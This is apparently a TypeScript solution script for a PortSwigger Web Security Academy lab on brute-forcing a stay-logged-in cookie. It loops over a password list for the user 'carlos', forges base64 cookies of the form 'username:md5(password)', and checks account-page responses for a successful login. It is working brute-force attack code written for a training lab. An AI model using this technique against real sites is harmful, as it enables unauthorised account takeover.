/**
 * PortSwigger Lab: Brute-forcing a stay-logged-in cookie
 * https://portswigger.net/web-security/authentication/other-mechanismsx/lab-brute-forcing-a-stay-logged-in-cookie
 */

import crypto from "crypto"

import { PASSWORDS, Sess } from "../base"

const LABID = "0a5400c704a953308d07580b0085005b"

const iter = async (usnm: string, pswd: string) => {
	const r1 = await Sess.req`
		GET /my-account?id=${usnm} HTTP/1.1
		Sec-GPC: 1
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		sec-ch-ua: "Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"
		sec-ch-ua-mobile: ?0
		sec-ch-ua-platform: "macOS"
		Accept-Language: en-GB,en;q=0.5
		Referer: https://${LABID}.web-security-academy.net/login
		Cookie: stay-logged-in=${btoa(`${usnm}:${crypto.createHash("md5").update(pswd).digest("hex")}`)};
	`

	return r1.body().includes("Update email")
}

for (const P of PASSWORDS) {
	if (await iter("carlos", P)) {
		console.log("PASSWORD SUCCESS:", P)
		break
	} else {
		console.log("PASSWORD FAILURE:", P)
	}
}
